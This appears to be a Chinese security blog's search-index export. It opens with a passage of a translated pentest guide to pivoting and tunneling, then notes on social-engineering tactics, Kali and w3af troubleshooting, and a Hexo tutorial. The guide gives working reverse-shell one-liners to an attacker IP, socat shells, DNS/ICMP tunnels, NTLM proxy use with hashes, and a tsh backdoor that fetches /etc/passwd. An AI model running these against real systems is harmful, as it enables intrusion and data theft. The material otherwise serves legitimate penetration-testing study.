NAT场景这是我在交战中遇到的最常见的情况。到目标的流量正在转发到逐个端口的基础上。这意味着除了端口转发规则以外的所有端口都不能从外部访问。一种可能的解决方案是启动反向连接。下面介绍的工具将帮助你做到这一点。 SSH反向端口转发/w 3proxy这个跳板设置看起来像这样：在目标服务器上使用以下配置运行3proxy服务：1socks -p31337 在接收方（攻击者的机器）上创建一个单独的用户。1adduser sshproxy 这个用户必须是低权限的，不应该有shell权限。毕竟，你不想被反向渗透，你呢？:)编辑/etc/passwd并将shell切换到/bin/false。它应该是这样的：1234root:x:0:0:root:/root:/bin/bash...sshproxy:x:1000:1001:,,,:/home/sshproxy:/bin/false... 现在使用-R标志连接到新创建的用户的服务器。Linux系统：1ssh sshproxy@your_server -R 31337:127.0.0.1:31337 对于Windows，你将需要首先上传plink.exe。这是一个putty的控制台版本。运行它：1plink.exe sshproxy@your_server -R 31337:127.0.0.1:31337 -R标志允许你绑定服务器端的端口。到此端口的所有连接都将被中继到客户端上的指定端口。这样我们就可以在客户端运行3proxy socks服务（受感染的机器）并通过ssh-R标志访问攻击者主机上的这个端口。 Rpivot这是我最喜欢穿越NAT连接的方法。Rpivot是一个反向socks代理工具，可以让你通过socks代理隧道化流量。它连接回你的机器，并绑定一个socks代理。它的工作方式与ssh -D很像，但方向相反。服务器端：1python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0 客户端：1python client.py --server-ip &lt;ip&gt; --server-port 9999 结果，一个socks4代理服务将被绑定在服务器端的1080端口。 从内部网络泄漏这是另一种情况。比方说，你的社会工程学表演最终让你进入了内部网络。你的连接受限，并且能够在受感染的计算机上执行命令。当然，如果互联网直接路由，而不是用做防火墙，你可以凭借任何上述技术。但如果你不那么幸运，还是有办法把你的出路转出来。 ICMP隧道如果icmp流量被允许到外部网络，那么很可能你可以建立一个icmp隧道。缺点是你需要在目标系统上拥有root/administrator权限，因为有必要使用原始套接字。检查这个工具 - http://code.gerade.org/hans/ 。我个人从来没有尝试过在Windows上运行它。它在Linux上非常有效。服务器端命令（攻击者的机器）：1./hans -v -f -s 1.1.1.1 -p P@ssw0rd -v标志是详细的，-f标志在前台运行，-s标志的值是服务器在新创建的tun接口上的ip。客户端：1./hans -f -c &lt;server_ip&gt; -p P@ssw0rd -v 连接成功后，客户端应该可以直接在1.1.1.100处看到：123# ping 1.1.1.100PING 1.1.1.100 (1.1.1.100) 56(84) bytes of data.64 bytes from 1.1.1.100: icmp_seq=1 ttl=65 time=42.9 ms 现在你可以使用这台机器作为进入内部网络的大门。将本机用作默认网关或连接到管理界面（ssh/tsh /web shell）。 DNS隧道如果有任何广域网流量被阻塞，但是外部主机名被解析，那么就有可能通过DNS查询来进行隧道通信。你需要注册一个用于此技术工作的域名。这个手册可能会帮助你设置你的名称服务器。 Iodine如果发生这种情况，并且在服务器上获得了root访问权限，你可以试试iodine。它几乎像hans icmp隧道工具一样工作 - 它创建了一对tun适配器，并将它们之间的数据作为DNS查询进行隧道传输。服务器端：1iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com 客户端：1iodine -f -P P@ssw0rd tunneldomain.com -r 连接成功将在地址1.1.1.2处产生直接的客户端可见性。请注意，这种隧道技术非常慢。你最好的选择是在生成的连接上使用一个压缩的ssh连接：1ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080 Dnscat2Dnscat2通过递归DNS查询建立C＆C通道。这个工具不需要root/administrator权限（在windows和linux上都可以）。它也支持端口转发。服务器端：1ruby ./dnscat2.rb tunneldomain.com 客户端：1./dnscat2 tunneldomain.com 在收到服务器端的连接后，可以使用windows命令查看活动会话：12345dnscat2&gt; windows0 :: main [active] dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*] 1 :: command session (debian) 2 :: sh (debian) [*] 要启动端口转发，请选择带有session -i &lt;num&gt;的命令会话：12345678910dnscat2&gt; session -i 1New window created: 1New window created: 1history_size (session) =&gt; 1000This is a command session!That means you can enter a dnscat2 command such as'ping'! For a full list of clients, try 'help'.command session (debian) 1&gt; 使用listen [lhost:]lport rhost:rport命令转发一个端口：1command session (debian) 1&gt; listen 127.0.0.1:8080 10.0.0.20:80 这将绑定攻击者机器上的8080端口，并将所有连接转发到10.0.0.20:80。 公司的HTTP代理作为一种出路HTTP代理组织的地方为他们的员工访问外部网络应用程序提供了一个良好的渗出机会，因为你有正确的凭据;） Rpivot我已经在NAT穿越部分提到了这个工具。它还支持通过NTLM HTTP代理连接到外部世界。服务器端命令保持不变，使用客户端命令如下：123python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999\--ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\--username Alice --password P@ssw0rd 或者如果你有LM:NT哈希而不是密码：123python client.py --server-ip &lt;rpivot_server_ip&gt;\--server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\--username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45 CntlmCntlm是通过NTLM代理运行任何非代理感知程序的首选工具。基本上这个工具对一个代理进行身份验证，并将本地端口绑定到你指定的外部服务。这个端口绑定不需要任何认证，所以你可以直接使用你的工具（例如putty/ssh）。它使用配置文件进行操作。这里有一个准系统配置的例子来转发端口443（这个端口是最有可能被允许通过代理的）：12345Username AlicePassword P@ssw0rdDomain CONTOSO.COMProxy 10.0.0.10:8080Tunnel 2222:&lt;attackers_machine&gt;:443 运行：1cntlm.exe -c config.conf 或者如果你在Linux上：1./cntlm -c config.conf 现在，假设你已经在远程主机的443端口上运行ssh，你可以启动ssh客户端（openssh/putty）并连接到本地端口2222来访问外部机器。 通过HTTP代理的OpenVpnOpenVpn是巨大的，所以它从头开始的配置超出了这篇文章的范围。只需简单提一下 - 它也支持通过NTLM代理的隧道TCP连接。将此行添加到你的配置文件中：1http-proxy &lt;proxy_ip&gt; 8080 &lt;file_with_creds&gt; ntlm 凭证文件应该在不同的行上包含用户名和密码。而且，是的，你需要root。 利用带有proxychains的SOCKS如果你的程序不使用原始套接字（例如，nmap syn-scan），那么很可能你可以使用proxychains来强制你的程序通过socks代理。编辑/etc/proxychains.conf中的代理服务器：12345[ProxyList]# add proxy here ...# meanwile# defaults set to "tor"socks4 127.0.0.1 3128 准备好了，只需在你最喜欢的pwn工具上添加proxychains：1proxychains program_name 与proxychains一起使用的impacket’s psexec.py： DNS与proxychainsProxychains在解析主机名时不遵循socks RFC。它拦截gethostbyname libc调用并通过socks代理隧道化tcp DNS请求。事情是，DNS服务器硬编码到4.2.2.2。你可能需要更改名称服务器以解析内部网络上的名称。一个典型的情况是如果你正在测试Windows环境，将名称服务器更改为域控制器。该设置位于/usr/lib/proxychains3/proxyresolv：123456789101112#!/bin/sh# This script is called by proxychains to resolve DNS names# DNS server used to resolve namesDNS_SERVER=$&#123;PROXYRESOLV_DNS:-4.2.2.2&#125; #change nameserver hereif [ $# = 0 ] ; then echo " usage:" echo " proxyresolv &lt;hostname&gt; " exitfi 美化你的web shell这部分内容与pivoting或tunneling没有直接关系，而是描述了在内部网络发展攻击时简化工作的方法。通常情况下，使用web-shell非常繁琐，特别是在使用需要交互式命令界面的程序时。很可能你会使用一些解决方法来执行简单的任务，比如将密码传递给sudo/su或者只是编辑一个文件。我不是一个折磨自己的狂热爱好者，所以当有一个机会将web-shell升级到一个交互式shell时，我这样做:)我不会介绍像使用bash/perl/python等启动半交互式shell。有很多关于这样做的信息。看看这个反向shell备忘单 - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 。 Python PTY shell从常规的半交互式shell升级。你可以在现有的shell中执行以下命令：1python -c 'import pty; pty.spawn("/bin/bash")' 或者启动反向连接：1234python -c 'import socket,subprocess,os;\s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\s.connect(("&lt;attackers_ip&gt;",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' SocatNetcat的加强版！可是说实话，去检查这个工具的手册man socat，你会惊奇你可以用这个工具做隧道化的工作。除此之外，它可以产生一个完全交互的shell，甚至比前面提到的python-pty更好。缺点是你很可能将不得不在目标服务器上编译/安装这个工具，因为它不是大多数类Unix发行版中的默认工具。 绑定shell设置监听器：1socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane 连接到监听器：1socat FILE:`tty`,raw,echo=0 TCP:&lt;victim_ip&gt;:1337 反向shell：设置监听器：1socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0 连接到攻击者的机器：1socat TCP4:&lt;attackers_ip&gt;:1337 EXEC:bash,pty,stderr,setsid,sigint,sane 终端大小默认情况下，终端的大小是相当小的，当启动top命令或使用文本编辑器编辑文件时你可能会注意到。你可以很容易地改变这个，使用stty -a命令来获得你的常规终端的大小：12$ stty -aspeed 38400 baud; rows 57; columns 211; line = 0; 将所需的尺寸应用到你的socat终端：1$ stty rows 57 cols 211 TshTsh是一个小型的ssh式后门，带有完整的pty终端，并具有文件传输能力。这个工具的占用空间非常小，并且很容易在大多数类Unix系统上编译。从编辑tsh.h文件开始：12345678910111213141516#ifndef _TSH_H#define _TSH_Hchar *secret = "never say never say die";#define SERVER_PORT 22short int server_port = SERVER_PORT;/*#define CONNECT_BACK_HOST "localhost"#define CONNECT_BACK_DELAY 30*/#define GET_FILE 1#define PUT_FILE 2#define RUNSHELL 3#endif /* tsh.h */ 更改secret，指定SERVER_PORT。如果你想反向连接，取消注释并编辑CONNECT_BACK_HOST和CONNECT_BACK_DELAY指令。运行make：12345678910111213141516$ make linux_x64make \ LDFLAGS=" -Xlinker --no-as-needed -lutil" \ DEFS=" -DLINUX" \ tsh tshdmake[1]: Entering directory '/tmp/tsh'gcc -O3 -W -Wall -DLINUX -c pel.cgcc -O3 -W -Wall -DLINUX -c aes.cgcc -O3 -W -Wall -DLINUX -c sha1.cgcc -O3 -W -Wall -DLINUX -c tsh.cgcc -Xlinker --no-as-needed -lutil -o tsh pel.o aes.o sha1.o tsh.ostrip tshgcc -O3 -W -Wall -DLINUX -c tshd.cgcc -Xlinker --no-as-needed -lutil -o tshd pel.o aes.o sha1.o tshd.ostrip tshdmake[1]: Leaving directory '/tmp/tsh' 现在在服务器上运行./tshd。它将开始监听指定的端口。您可以通过执行以下命令连接到它：1./tsh host_ip 如果tsh被编译有反向连接功能，tshd守护进程将尝试连接回攻击者的机器。在攻击者侧启动监听：12$ ./tsh cbWaiting for the server to connect... 用tsh传输文件：12./tsh host_ip get /etc/passwd ../tsh host_ip put /bin/netcat /tmp]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[《欺骗的艺术》读书笔记]]></title>
    <url>%2F2017%2F12%2F05%2Fthe-art-of-deception%2F</url>
    <content type="text"><![CDATA[人的因素是安全过程中最薄弱的环节。 你只要说你是一个写书的或者写电影剧本的，每个人都会对你开绿灯。 把重要的问题掺杂在琐碎的、不合逻辑的问题中间，这样可以给人一种可信的感觉。 不要在得到关键信息后马上结束谈话。再问两三个问题，闲聊几句，然后才说再见。以后，如果受害者记起你曾经问过什么，则极有可能是最后几个问题，其他的通常都忘掉了。 两三样信息可能就足以支撑起一次成功的假冒行为 —— 社交工程师冒用别人的身份。取得职员的名字、他的电话，以及他的职员编号 —— 或许，最好也能得到其经理的名字和电话 —— 这样，即使一个半瓶子醋的社交工程师，也有了足够的信息，使自己在给下一个目标打电话时听起来非常可信。 安全培训需要强调一点：当你有疑虑时，必须确认，确认，再确认。 执法部门的人跟军队里的人一样，从接受训练的第一天起就形成了一个根深蒂固的等级观念。只要社交工程师扮作警官或中尉 —— 级别比跟他谈话的人高 —— 受害者就会拘于一条长时间得来的教训，即“不要质问比你职别高的人”。级别，换个说法，就是特权，尤其是不被级别低的人质问的特权。 每个人都应该明白社交工程师的伎俩：获得尽可能多的与目标有关的信息，再利用这些信息使人相信自己是内部人员。然后一剑封喉。 逆向社交工程学：一种社交工程攻击方式。攻击者建立起这样一个场景：让受害者遇到问题，并向攻击者寻求帮助。逆向社交工程学的另一种表现形式是以其人之道还治其人之身。攻击目标识别出自己受到了攻击，从而利用心理学原理来牵制攻击者，并且从他那里引诱出尽可能多的信息，进而有效的保护目标资产。 新员工最容易成为攻击者的目标。他们认识的人还不多，也不太清楚公司的办事程序，以及什么该做什么不该做。而且，为给人留下良好的第一印象，他们急于表现自己是多么乐于合作与反应迅捷。 第一条原则：除非万不得已，否则不要造访他们的办公室。仅凭着电话中的声音，他们是很难认出你来的，而如果他们不能人称认出你，那就不能逮捕你。]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali持久加密USB安装所遇问题总结]]></title>
    <url>%2F2017%2F12%2F04%2Fkali-live-usb-bug%2F</url>
    <content type="text"><![CDATA[Writing superblocks and filesystem accounting information今天在将Kali安装到U盘上时遇到了上面所示的问题，也可以翻译成“写入超级块和文件系统账户统计信息”，具体情况是当使用mkfs.ext4格式化加密分区时，程序运行到上面所示的地方停止不动，无论等多久都无法完成，其间还会发生U盘挂掉又重连上的情况，使用dmesg命令诊断故障时发现如下错误：123...device descriptor read/8, error -110... 经判断是因为主板无法提供给U盘足够的电量所导致的，因为我的U盘和虚拟机之间是3.0连接的，3.0连接要比2.0连接耗电，所以讲U盘和虚拟机之间的连接改为2.0即可解决这个问题。]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metasploit中shell中文乱码解决方案]]></title>
    <url>%2F2017%2F12%2F04%2Fmetasploit-luanma%2F</url>
    <content type="text"><![CDATA[有时在Kali Linux中获得了一个Windows shell或者在meterpreter中进入shell后，执行命令可能会出现中文乱码，其原因是Windows和Linux的编码不同，导致Windows中的中文在Linux中无法正常显示。解决方法： 在shell窗口的工具栏选择“编辑”——&gt;“首选项”——&gt;“编码”，选中简体中文的三个编码：GB18030，GB2312，GBK，打勾并退出 接着在“终端”——&gt;“设定字符编码”中选择添加的三个简体中文编码之一即可注意： 这个设置会随着操作系统的重启而失效 设定简体中文编码之后，Linux中的中文字符就会乱码，因为Linux使用UTF-8编码 建议只在需要的时候设定简体中文编码]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Rolling 2017更新后无法启动解决方案]]></title>
    <url>%2F2017%2F11%2F25%2Fkali-update-bug%2F</url>
    <content type="text"><![CDATA[BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)有时更新Kali后重新启动会出现如下显示，并无法进入系统界面1234BusyBox v1.27.2 (Debian 1:1.27.2-1) built-in shell (ash)Enter 'help' for a list of built-in commands.(initramfs) 解决方法： 在此界面输入blkid命令，查看自己的分区号 依据自己的分区号输入fsck -y /dev/sda1，我的分区号是sda1。 输入exit命令退出重启电脑]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Rolling 2017下安装w3af出错解决方案]]></title>
    <url>%2F2017%2F11%2F08%2Fkali-w3af-bug%2F</url>
    <content type="text"><![CDATA[Run error: “‘module’ object has no attribute ‘SSL_ST_INIT’”.”解决方法1：修改/usr/local/lib/python2.7/dist-packages/OpenSSL/SSL.py文件，将下面四行注释掉1234#SSL_ST_INIT = _lib.SSL_ST_INIT#SSL_ST_BEFORE = _lib.SSL_ST_BEFORE#SSL_ST_OK = _lib.SSL_ST_OK#SSL_ST_RENEGOTIATE = _lib.SSL_ST_RENEGOTIATE 解决方法2： 卸载w3af要求的pyOpenSSL版本 1$ pip uninstall pyOpenSSL 安装最新版pyOpenSSL 1$ pip install pyOpenSSL 编辑w3af安装目录中的/w3af/core/controllers/dependency_check/requirements.py文件，将要求的pyOpenSSl版本号改为你安装的最新版，即修改下面这一行代码 1PIPDependency('OpenSSL', 'pyOpenSSL', 'Version of pyOpenSSL you are using') error: command ‘x86_64-linux-gnu-g++’ failed with exit status 1解决方法：使用如下命令安装相关依赖12$ apt-get build-dep python-lxml$ apt-get install libxslt-dev libssl-dev ImportError: No module named webkit启动GUI界面时可能会报此错误，原因是未安装相关模块解决方法：执行如下命令1$ apt-get install python-webkit python-webkit-dev 在Kali下，因为python-webkit，python-webkit-dev不在Kali默认的源中，所以需要执行下面的命令1234567$ wget http://ftp.cn.debian.org/debian/pool/main/p/python-support/python-support_1.0.15_all.deb$ dpkg -i python-support_1.0.15_all.deb$ wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit_1.1.8-3_amd64.deb$ dpkg -i python-webkit_1.1.8-3_amd64.deb$ apt install python-gtk2-dev$ wget http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit-dev_1.1.8-3_all.deb$ dpkg -i python-webkit-dev_1.1.8-3_all.deb 安装过程中可能需要安装相关依赖，可执行如下命令1$ apt --fix-broken install ImportError: No module named gtksourceview2同样，启动GUI时也可能报此错误解决方法：执行如下命令1$ apt-get install python-gtksourceview2]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo初体验]]></title>
    <url>%2F2017%2F06%2F20%2Fhexo-experience%2F</url>
    <content type="text"><![CDATA[Hexo是一个基于Node.js的开源静态博客框架，类似于Jekyll，不同的是，Jekyll采用Ruby语言开发。 安装安装Hexo前，需要安装Node.js和Git，安装Node.js的同时，npm(Node Package Manager)也已经被自动安装了，同时安装程序也自动配置了环境变量。确定安装完成后，可以输入1$ node -v 来测试Node.js是否成功安装，输入1$ npm -v 来测试npm是否成功安装。 npm成功安装后，可使用1$ npm install -g hexo-cli 来快速安装Hexo 参数-g表示全局安装，npm的包安装分为本地安装（local）和全局安装（global）两种，区别在于： 本地安装 将安装包放在 ./node_modules 下（运行npm时所在的目录） 可以通过 require() 来引入本地安装的包 全局安装 将安装包放在 /usr/local下 可以直接在命令行里使用 关于npm更多的内容请参考npm模块安装机制简介。 更新在博客所在目录执行npm update -g即可更新Hexo。 常用命令新建一个网站1$ hexo init [folder] 如果没有设置 folder ，Hexo 默认在目前的文件夹建立网站。 新建一篇文章1$ hexo n [layout] &lt;title&gt; 如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。 生成静态文件1$ hexo g 启动服务预览1$ hexo s 部署网站1$ hexo d 清除缓存文件(db.json)和已生成的静态文件(public)。1$ hexo clean 在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。 更多目录结构在Hexo生成的网站目录中，public目录保存着已经生成的静态文件，source目录保存着markdown格式的源文件，themes目录保存着主题文件，_config.yml文件为站点配置文件。 关于如何利用Hexo以及GitHub Pages搭建个人博客的更详细内容，请参考GitHub + Hexo 搭建个人网站详细教程。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
